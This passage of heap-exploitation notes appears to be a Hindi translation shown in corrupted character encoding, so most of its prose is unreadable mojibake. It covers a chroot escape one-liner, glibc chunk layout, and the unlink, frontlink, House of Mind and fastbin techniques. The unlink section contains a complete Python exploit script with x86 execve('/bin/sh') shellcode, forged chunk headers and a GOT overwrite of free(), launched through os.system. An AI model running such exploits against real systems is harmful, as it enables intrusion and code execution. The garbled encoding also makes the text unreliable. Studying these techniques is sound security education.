рд╕рд╣реЗрдЬреА рдЧрдИ рдкрддрд╛ рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ system() рд╣реЛрдЧрд╛ред

**chroot() рдХреЗ рд╕рд╛рде рдЬреЗрд▓**

debootstrap -arch=i386 hardy /home/user тАФ> рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЗ рддрд╣рдд рдПрдХ рдмреБрдирд┐рдпрд╛рджреА рд╕рд┐рд╕реНрдЯрдо рд╕реНрдерд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИред

рдПрдХ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЗрди рдЬреЗрд▓реЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд╕рдХрддрд╛ рд╣реИ: mkdir foo; chroot foo; cd ..

**рдХреЛрдб рдХрд╛ рдЙрдкрдХрд░рдг**

Valgrind тАФ> рддреНрд░реБрдЯрд┐рдпреЛрдВ рдХреА рдЦреЛрдЬ рдХрд░рддрд╛ рд╣реИ\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 рд╣реАрдк рдУрд╡рд░рдлреНрд▓реЛ: рдореВрд▓ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреНрд╕**

**рдЖрд╡рдВрдЯрд┐рдд рдЦрдВрдб**

рдкрд┐рдЫрд▓рд╛_рдЖрдХрд╛рд░ |\
рдЖрдХрд╛рд░ | тАФрд╣реЗрдбрд░\
\*рдореЗрдо | рдбреЗрдЯрд╛

**рдлреНрд░реА рдЦрдВрдб**

рдкрд┐рдЫрд▓рд╛_рдЖрдХрд╛рд░ |\
рдЖрдХрд╛рд░ |\
\*fd | рдкреНрд╡рд╛рдЗрдВрдЯрд░ рдлреЙрд░рд╡рд░реНрдб рдЪрдВрдХ\
\*bk | рдкреНрд╡рд╛рдЗрдВрдЯрд░ рдмреИрдХ рдЪрдВрдХ тАФрд╣реЗрдбрд░\
\*рдореЗрдо | рдбреЗрдЯрд╛

рдлреНрд░реА рдЦрдВрдб рдПрдХ рдбрдмрд▓ рд▓рд┐рдВрдХреНрдб рд▓рд┐рд╕реНрдЯ рдореЗрдВ рд╣реЛрддреЗ рд╣реИрдВ (рдмрд┐рди) рдФрд░ рдХрднреА рднреА рджреЛ рдлреНрд░реА рдЦрдВрдб рдПрдХ рд╕рд╛рде рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреЗ (рд╡реЗ рдорд┐рд▓ рдЬрд╛рддреЗ рд╣реИрдВ)

"рдЖрдХрд╛рд░" рдореЗрдВ рдмрд┐рдЯ рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рдЗрдВрдбрд┐рдХреЗрдЯ рдХрд░рддреЗ рд╣реИрдВ: рдпрджрд┐ рдкрд┐рдЫрд▓рд╛ рдЦрдВрдб рдЗрд╕реНрддреЗрдорд╛рд▓ рдореЗрдВ рд╣реИ, рдпрджрд┐ рдЦрдВрдб mmap() рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЖрд╡рдВрдЯрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдпрджрд┐ рдЦрдВрдб рдкреНрд░рд╛рдердорд┐рдХ
рдЬрдм unlink() рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ P->fd рдХреЗ рд░реВрдк рдореЗрдВ рджреВрд╕рд░реЗ рдЯреБрдХрдбрд╝реЗ рдХреЗ рдкрд╣рд▓реЗ рдбреЗрдЯрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЬрд┐рд╕рдореЗрдВ рдЙрд╕ рдкрддреЗ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ - 12 (рдХреНрдпреЛрдВрдХрд┐ FD->bk рдореЗрдВ FD рдореЗрдВ рд╕рд╣реЗрдЬреЗ рдЧрдП рдкрддреЗ рдореЗрдВ 12 рдХреЛ рдЬреЛрдбрд╝ рджреЗрдЧрд╛)ред рдФрд░ рдЙрд╕ рдкрддреЗ рдореЗрдВ рджреВрд╕рд░рд╛ рдкрддрд╛ рдбрд╛рд▓рд╛ рдЬрд╛рдПрдЧрд╛ рдЬреЛ рджреВрд╕рд░реЗ рдЯреБрдХрдбрд╝реЗ рдореЗрдВ рдорд┐рд▓рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рд╣рдореЗрдВ рд╢реЗрд▓рдХреЛрдб (P->bk рдирдХрд▓реА) рдХрд╛ рдкрддрд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes рдХреА рднрд░рд╛рдИ**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<IтАЭ, 0xfffffff0) #рдкрд┐рдЫрд▓реЗ рдЯреБрдХрдбрд╝реЗ рдореЗрдВ рдЦрд╛рд▓реА рд╣реЛрдиреЗ рдХрд╛ рдмрд┐рдЯ 1 рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП**

**fake\_size = pack("\<IтАЭ, 0xfffffffc) #-4, рддрд╛рдХрд┐ 3 рд╡реЗрдВ рдЯреБрдХрдбрд╝реЗ рдХрд╛ "рд╕рд╛рдЗрдЬ" 4 рдмрд╛рдЗрдЯ рдкреАрдЫреЗ рд╣реИ (рдкрд┐рдЫрд▓реЗ_рд╕рд╛рдЗрдЬ рдХреА рдУрд░ рджреЗрдЦрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ 2 рд╡реЗрдВ рдЯреБрдХрдбрд╝рд╛ рдЦрд╛рд▓реА рд╣реИ)**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #рдкреЗрд▓реЛрдб рдореЗрдВ рд╢реБрд░реБрдЖрдд рдореЗрдВ рд╣рдордиреЗ 8 рдмрд╛рдЗрдЯ рднрд░рд╛рдИ рд╣реИрдВ**

**got\_free = pack("\<I", 0x08048300 - 12) #free() рдХрд╛ рдкрддрд╛ plt-12 (рдпрд╣ рдкрддрд╛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рддрд╛рдХрд┐ free рдХреЛ рджреВрд╕рд░реА рдмрд╛рд░ рдХреЙрд▓ рдХрд░рдиреЗ рдкрд░ рд╢реЗрд▓рдХреЛрдб рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдП)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # рдЬреИрд╕рд╛ рдХрд┐ рдХрд╣рд╛ рдЧрдпрд╛ рдерд╛, рдкреЗрд▓реЛрдб 8 рдмрд╛рдЗрдЯ рднрд░рд╛рдИ рдХреЗ рд╕рд╛рде рд╢реБрд░реВ рд╣реЛрддреА рд╣реИ рдХреНрдпреЛрдВрдХрд┐**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #2 рд╡реЗрдВ рдЯреБрдХрдбрд╝реЗ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, got\_free рдЙрд╕ рдЬрдЧрд╣ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рддрд╛ рд╣реИ рдЬрд╣рд╛рдВ рд╣рдо рдкрддрд╛ addr\_sc + 12 рдХреЛ рд╕рд╣реЗрдЬреЗрдВрдЧреЗ**

**os.system("./8.3.o " + payload)**

**unset() рдЙрд▓рдЯреА рджрд┐рд╢рд╛ рдореЗрдВ рдореБрдХреНрдд рдХрд░рддреЗ рд╣реБрдП (wargame)**

рд╣рдо 3 рд▓рдЧрд╛рддрд╛рд░ рдЯреБрдХрдбрд╝реЛрдВ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЙрдирдХреЗ рдЖрд░рдХреНрд╖рд┐рдд рдХреНрд░рдо рдореЗрдВ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ:

рдЪрдВрдХ c рдореЗрдВ рд╢реЗрд▓рдХреЛрдб рдбрд╛рд▓рд╛ рдЬрд╛рддрд╛ рд╣реИ

рдЪрдВрдХ a рдХрд╛ рдЙрдкрдпреЛрдЧ b рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╕рд╛рдЗрдЬ рдХрд╛ рдкрд┐рдЫрд▓рд╛ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдмрд┐рдЯ рдирд┐рд╖реНрдХреНрд░рд┐рдп рд╣реЛ рдЬрд╛рдП рддрд╛рдХрд┐ рдЪрдВрдХ a рдЦрд╛рд▓реА рд╣реИ рдпрд╣ рд╕реЛрдЪреЗрдЧрд╛ред

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рд╣реЗрдбрд░ b рдореЗрдВ рд╕рд╛рдЗрдЬ рдХреЛ -4 рдХреЗ рд░реВрдк рдореЗрдВ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЗрд╕рд▓рд┐рдП, рдкреНрд░реЛрдЧреНрд░рд╛рдо "a" рдХреЛ рдПрдХ рдмрд┐рди рдореЗрдВ рдорд╛рдиреЗрдЧрд╛ рдФрд░ рдЗрд╕реЗ рдЕрдирд▓рд┐рдВрдХ() рдХреЛ рдЕрдирд▓рд┐рдВрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣реЗрдЧрд╛ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдХреНрдпреЛрдВрдХрд┐ рд╣реЗрдбрд░ рдкрд┐рдЫрд▓рд╛_рд╕рд╛рдЗрдЬ -4 рд╣реИред рдпрд╣ рд╕реЛрдЪреЗрдЧрд╛ рдХрд┐ "a" рдХрд╛ рдЯреБрдХрдбрд╝рд╛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ b+4 рд╕реЗ рд╢реБрд░реВ рд╣реЛ рд░рд╣рд╛ рд╣реИред рдЕрд░реНрдерд╛рдд, рдпрд╣ b+4 рд╕реЗ рд╢реБрд░реВ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдЯреБрдХрдбрд╝реЗ рдХреЛ рдЕрдирд▓рд┐рдВрдХ() рдХрд░реЗрдЧрд╛, рдЗрд╕рд▓рд┐рдП b+12 рдореЗрдВ рдкреЙрдЗрдВрдЯрд░ "fd" рд╣реЛрдЧрд╛ рдФрд░ b+16 рдореЗрдВ рдкреЙрдЗрдВрдЯрд░ "bk" рд╣реЛрдЧрд╛ред

рдЗрд╕ рддрд░рд╣, рдпрджрд┐ рд╣рдо bk рдореЗрдВ рд╢реЗрд▓рдХреЛрдб рдХрд╛ рдкрддрд╛ рдФрд░ fd рдореЗрдВ "puts()" рдХреЗ рд▓рд┐рдП рдкрддрд╛ -12 рдбрд╛рд▓рддреЗ рд╣реИрдВ, рддреЛ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдкреЗрд▓реЛрдб рд╣реЛрддрд╛ рд╣реИред

**рдлреНрд░рдВрдЯрд▓рд┐рдВрдХ рддрдХрдиреАрдХ**

рдЬрдм рдХреБрдЫ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЙрд╕рдХреЗ рдХреЛрдИ рднреА рдкрдбрд╝реЛрд╕реА рдЯреБрдХрдбрд╝реЗ рдореБрдХреНрдд рдирд╣реАрдВ рд╣реИрдВ, рддреЛ unlink() рдХреЛ рдирд╣реАрдВ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдмрд▓реНрдХрд┐ рд╕реАрдзреЗ frontlink() рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЙрд╕ рд╕рдордп рдЙрдкрдпреЛрдЧреА рджреЛрд╖ рдЬрдм malloc рдЬрд┐рд╕ рдкрд░ рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрднреА рдореБрдХреНрдд рдирд╣реАрдВ рд╣реЛрддрд╛ (free())ред

рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ:

рдПрдХ рдмрдлрд░ рдЬрд┐рд╕реЗ рдбреЗрдЯрд╛ рдЗрдирдкреБрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдУрд╡рд░рдлреНрд▓реЛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ

рдЗрд╕рдХреЗ рд╕рд╛рде рдПрдХ рд╕рдВрдпреБрдХреНрдд рдмрдлрд░ рдЬреЛ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рд╣реИ рдФрд░ рдЬрд┐рд╕рдХреЗ рд╣реЗрдбрд░ рдХрд╛ рдлреАрд▓реНрдб fd рдЙрд╕рдХреЗ рдкрд┐рдЫрд▓реЗ рдмрдлрд░ рдХреЗ рдУрд╡рд░рдлреНрд▓реЛ рдХреЗ рдХрд╛рд░рдг рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛

512 рд╕реЗ рдЕрдзрд┐рдХ рд▓реЗрдХрд┐рди рдкрд┐рдЫрд▓реЗ рдмрдлрд░ рд╕реЗ рдХрдо рдЖрдХрд╛рд░ рд╡рд╛рд▓рд╛ рдПрдХ рдмрдлрд░ рдореБрдХреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдЗрд╕рдХреЗ рдкрд┐рдЫрд▓реЗ рдЪрд░рдг рдореЗрдВ рдШреЛрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдлрд░ рдЬреЛ рдЗрд╕рдХреЗ prev\_size рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ

рдЗрд╕ рддрд░рд╣ рджреЛ mallocs рдХреЛ рдЕрдирд┐рдпрдВрддреНрд░рд┐рдд рд░реВрдк рд╕реЗ рдУрд╡рд░рд░рд╛рдЗрдб рдХрд░рдиреЗ рдФрд░ рдПрдХ рдХреЗрд╡рд▓ рдирд┐рдпрдВрддреНрд░рд┐рдд рд░реВрдк рд╕реЗ рдореБрдХреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
рджреВрд╕рд░реЗ рдЦрдВрдб рдореЗрдВ рдФрд░ рдкрд╣рд▓реЗ рдХреЗ рдХрд╛рд░рдг рд╣рдо prev\_size рдХреЛ рдПрдХ jump 0x0c рдХреЗ рд╕рд╛рде рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ size рдХреЛ рдХреБрдЫ рдРрд╕рд╛ рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ -> NON\_MAIN\_ARENA рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░реЗрдВред

рдЗрд╕рдХреЗ рдмрд╛рдж рдЦрдВрдб 2 рдореЗрдВ рд╣рдо рдмрд╣реБрдд рд╕рд╛рд░реЗ nops рдбрд╛рд▓рддреЗ рд╣реИрдВ рдФрд░ рдЕрдВрдд рдореЗрдВ рд╢реЗрд▓рдХреЛрдб рдбрд╛рд▓рддреЗ рд╣реИрдВред

рдЗрд╕ рддрд░рд╣, \_int\_free(TROZO1, TROZO2) рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдпрд╣ \_\_DTOR\_END\_\_ рдореЗрдВ TROZO2 рдХреЗ prev\_size рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдЧрд╛ рдЬреЛ рд╢реЗрд▓рдХреЛрдб рдкрд░ рдЬрд╛рдПрдЧрд╛ред

рдЗрд╕ рддрдХрдиреАрдХ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рдЕрдзрд┐рдХ рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ рдкреВрд░реА рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП рдЬреЛ рдкреЗрд▓реЛрдб рдХреЛ рдереЛрдбрд╝рд╛ рдФрд░ рдЬрдЯрд┐рд▓ рдмрдирд╛ рджреЗрддреА рд╣реИрдВред

рдпрд╣ рддрдХрдиреАрдХ рдЕрдм рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЙрдиреНрд▓рд┐рдВрдХ рдХреЗ рд▓рд┐рдП рд▓рдЧрднрдЧ рдПрдХ рд╣реА рдкреИрдЪ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рдпрд╣ рддреБрд▓рдирд╛ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдирдП рд╕реНрдерд╛рди рдХреЛ рдЬрд┐рд╕реЗ рдирд┐рд╢рд╛рдирд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рдЙрд╕рдХреЗ рдкрд╛рд╕ рднреА рдЙрд╕реА рдХреЛ рдирд┐рд╢рд╛рдирд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред

**Fastbin**

рдпрд╣ The house of mind рдХрд╛ рдПрдХ рд╡реЗрд░рд┐рдПрдВрдЯ рд╣реИред

рд╣рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ рдЬрд┐рд╕реЗ рд╣рдо рдкрд╣реБрдВрдЪрддреЗ рд╣реИрдВ рдЬрдм \_int\_free() рдХреЗ рдкрд╣рд▓реЗ рдХреА рдЬрд╛рдВрдЪ рдкрд╛рд░рд┐рдд рд╣реЛрддреА рд╣реИред

fb = &(av->fastbins\[fastbin\_index(size)] тАФ> рдЬреЛ fastbin\_index(sz) тАФ> (sz >> 3) - 2

тАж

p->fd = \*fb

\*fb = p

рдЗрд╕ рддрд░рд╣, рдпрджрд┐ "fb" рдореЗрдВ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд╣реИ, рддреЛ рдЗрд╕ рдкрддреЗ рдкрд░ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИ рдХрд┐ рдПрд░рд┐рдирд╛ dtors рдХреЗ рдкрддреЛрдВ рдХреЗ рдирд┐рдХрдЯ рд╣реЛред рдЕрдзрд┐рдХ рд╕рдЯреАрдХрддрд╛ рд╕реЗ рдХрд╣реЗрдВ рддреЛ av->max\_fast рдЙрд╕ рдкрддреЗ рдкрд░ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕реЗ рд╣рдо рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВред

The House of Mind рдХреЗ рд╕рд╛рде рд╣рдордиреЗ рджреЗрдЦрд╛ рдХрд┐ рд╣рдо рдПрд╡реА рдХреА рд╕реНрдерд┐рддрд┐ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреЗ рдереЗред

рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рд╣рдо size рдлрд╝реАрд▓реНрдб рдореЗрдВ 8 + NON\_MAIN\_ARENA + PREV\_INUSE рдбрд╛рд▓рддреЗ рд╣реИрдВ -> fastbin\_index() рд╣рдореЗрдВ fastbins\[-1] рджреЗрдЧрд╛, рдЬреЛ av->max\_fast рдХреЛ рдирд┐рд╢рд╛рдирд┐рдд рдХрд░реЗрдЧрд╛ред

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ av->max\_fast рдУрд╡рд░рд░рд╛рдЗрдЯ рд╣реЛрдЧрд╛ (рдирд┐рд╢рд╛рдирд┐рдд рдирд╣реАрдВ, рдмрд▓реНрдХрд┐ рдпрд╣ рд╕реНрдерд╛рди рдУрд╡рд░рд░рд╛рдЗрдЯ рд╣реЛрдЧрд╛)ред

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдЙрд╕реА рдЬрдЧрд╣ рдкрд░ рдЙрд╕ рдЯреБрдХрдбрд╝реЗ рдХрд╛ рдЖрдХрд╛рд░ 8 рд╕реЗ рдЕрдзрд┐рдХ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕реЗ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ -> рд╣рдордиреЗ рдХрд╣рд╛ рдХрд┐ рдЯреБрдХрдбрд╝реЗ рдХрд╛ рдЖрдХрд╛рд░ 8 рд╣реИ, рдЗрд╕ рдЭреВрдареЗ рдЯреБрдХрдбрд╝реЗ рдореЗрдВ рд╣рдореЗрдВ рдмрд╕ 8 рд╕реЗ рдЕрдзрд┐рдХ рдЖрдХрд╛рд░ рдбрд╛рд▓рдирд╛ рд╣реИ (рдФрд░ рдХреНрдпреЛрдВрдХрд┐ рд╢реЗрд▓рдХреЛрдб рдЙрд╕ рдЯреБрдХрдбрд╝реЗ рдореЗрдВ рдЬрд╛рдПрдЧрд╛, рд╣рдореЗрдВ рдкрд╣рд▓реЗ рдПрдХ рдЬрдореНрдк рдбрд╛рд▓рдирд╛ рд╣реЛрдЧрд╛ рдЬреЛ рдиреЙрдкреНрд╕ рдореЗрдВ рдЧрд┐рд░реЗрдЧрд╛)ред

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдЙрд╕реА рдЭреВрдареЗ рдЯреБрдХрдбрд╝реЗ рдХрд╛ av->system\_mem рд╕реЗ рдХрдо рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред av->system\_mem 1848 рдмрд╛рдЗрдЯ рджреВрд░ рд╣реИред

\_DTOR\_END\_ рдХреЗ рдирд▓реНрд╕ рдХреЗ рдХрд╛рд░рдг рдФрд░ GOT рдореЗрдВ рдХреБрдЫ рд╣реА рдкрддреЛрдВ рдХреЗ рдХрд╛рд░рдг, рдЗрди рд╕реЗрдХреНрд╢рдиреЛрдВ рдХрд╛ рдХреЛрдИ рдкрддрд╛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рдирд╣реАрдВ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЪрд▓рд┐рдП рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ рдкрд╛рдЗрд▓рд╛ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП fastbin рдХреЛ рдХреИрд╕реЗ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛рдПред

рдПрдХ рдФрд░ рд╣рдорд▓реЗ рдХрд╛ рддрд░реАрдХрд╛ рд╣реИ **av** рдХреЛ рдкрд╛рдЗрд▓реЗ рдХреА рдУрд░ рдкреБрдирд░реНрджрд┐рд╢рд╛ рдХрд░рдирд╛ред

рдпрджрд┐ рд╣рдо size рдХреЛ 8 рдХреА рдмрдЬрд╛рдп 16 рдХрд░ рджреЗрддреЗ рд╣реИрдВ рддреЛ: fastbin\_index() рд╣рдореЗрдВ fastbins\[0] рджреЗрдЧрд╛ рдФрд░ рд╣рдо рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдкрд╛рдЗрд▓реЗ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕рдХреЗ рд▓рд┐рдП рдкрд╛рдЗрд▓реЗ рдореЗрдВ рдХреЛрдИ рдХреИрдирд░реА рдпрд╛ рдЕрдЬреАрдм рдорд╛рдирдХ рдирд╣реАрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд╣рдореЗрдВ рдЗрд╕рдореЗрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП: 4 рдмрд╛рдЗрдЯ рдирд▓ + EBP + RET

4 рдмрд╛рдЗрдЯ рдирд▓ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **av** рдЗрд╕ рдкрддреЗ рдкрд░ рд╣реЛрдЧрд╛ рдФрд░ **av** рдХрд╛ рдкрд╣рд▓рд╛ рддрддреНрд╡ рд╡рд╣ mutex рд╣реИ рдЬреЛ 0 рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

**av->max\_fast** EBP рд╣реЛрдЧрд╛ рдФрд░ рдпрд╣ рд╣рдореЗрдВ рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЛ рдЫрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдореВрд▓реНрдп рдкреНрд░рджрд╛рди рдХрд░реЗрдЧрд╛ред

**av->fastbins\[0]** рдкрд░ **p** рдХрд╛ рдкрддрд╛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдпрд╣ RET рд╣реЛрдЧрд╛, рдЗрд╕ рддрд░рд╣ рд╢реЗрд▓рдХреЛрдб рдкрд░ рдЬрд╛рдПрдЧрд╛ред

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, **av->system\_mem** (рдкрд╛рдЗрд▓реЗ рдореЗрдВ рд╕реНрдерд┐рддрд┐ рд╕реЗ 1484 рдмрд╛рдЗрдЯ рдКрдкрд░) рдореЗрдВ рдХрд╛рдлреА рдХрдЪрд░рд╛ рд╣реЛрдЧрд╛ рдЬреЛ рд╣рдореЗрдВ рдЙрд╕ рдЬрд╛рдВрдЪ рдХреЛ рдЫрд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ рдЬреЛ рдХреА рдЬрд╛рддреА рд╣реИред

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдореБрдХреНрдд рдХрд┐рдП рдЧрдП рдЯреБрдХрдбрд╝реЗ рдХреЗ рд╕рдВрдЧрдд рдЯреБрдХрдбрд╝реЗ рдХрд╛ рдЖрдХрд╛рд░ 8 рд╕реЗ рдЕрдзрд┐рдХ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП -> рд╣рдордиреЗ рдХрд╣рд╛ рдХрд┐ рдореБрдХреНрдд рдХрд┐рдП рдЧрдП рдЯреБрдХрдбрд╝реЗ рдХрд╛ рдЖрдХрд╛рд░ 16 рд╣реИ, рдЗрд╕ рдЭреВрдареЗ рдЯреБрдХрдбрд╝реЗ рдореЗрдВ рд╣рдореЗрдВ рдмрд╕ 8 рд╕реЗ рдЕрдзрд┐рдХ рдЖрдХрд╛рд░ рдбрд╛рд▓рдирд╛ рд╣реИ (рдФрд░ рдХреНрдпреЛрдВрдХрд┐ рд╢реЗрд▓рдХреЛрдб рдЙрд╕ рдЯреБрдХрдбрд╝реЗ рдореЗрдВ рдЬрд╛рдПрдЧрд╛, рд╣рдореЗрдВ рдкрд╣рд▓реЗ рдПрдХ рдЬрдореНрдк рдбрд╛рд▓рдирд╛ рд╣реЛрдЧрд╛ рдЬреЛ рдиреЙрдкреНрд╕ рдХреЗ рдмрд╛рдж рдирдП рдЭреВрдареЗ рдЯреБрдХрдбрд╝реЗ рдХреЗ рдЖрдХрд╛рд░ рдХреЗ рдлрд╝реАрд▓реНрдб рдХреЗ рдмрд╛рдж рдЧрд┐рд░реЗрдЧрд╛)ред

